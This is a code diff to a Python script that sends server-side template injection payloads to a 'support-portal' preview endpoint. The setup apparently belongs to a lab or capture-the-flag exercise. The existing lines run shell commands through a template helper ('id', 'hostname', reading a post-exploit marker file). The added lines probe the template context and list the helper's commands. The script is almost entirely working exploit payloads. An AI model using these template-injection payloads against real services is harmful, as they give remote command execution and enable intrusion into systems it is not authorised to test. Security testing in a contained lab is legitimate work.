@@ -10,6 +10,9 @@ def show(title, value):
 
 def main():
     show("SSTI arithmetic probe", httpx.post("http://support-portal:8000/preview", json={"body": "{{ 7 * 7 }}"}).json())
+    show("Context probe", httpx.post("http://support-portal:8000/preview", json={"body": "{{ service.name }} / {{ support }}"}).json())
+    show("Support helper help", httpx.post("http://support-portal:8000/preview", json={"body": "{{ support.help() }}"}).json())
+    show("Support helper commands", httpx.post("http://support-portal:8000/preview", json={"body": "{{ support.list_commands() | json }}"}).json())
     show("Support marker", httpx.post("http://support-portal:8000/preview", json={"body": "{{ support.exec('cat /var/lib/support-portal/.post_exploit_marker') }}"}).json())
     show("Probe id", httpx.post("http://support-portal:8000/preview", json={"body": "{{ support.exec('id') }}"}).json())
     show("Probe hostname", httpx.post("http://support-portal:8000/preview", json={"body": "{{ support.exec('hostname') }}"}).json())
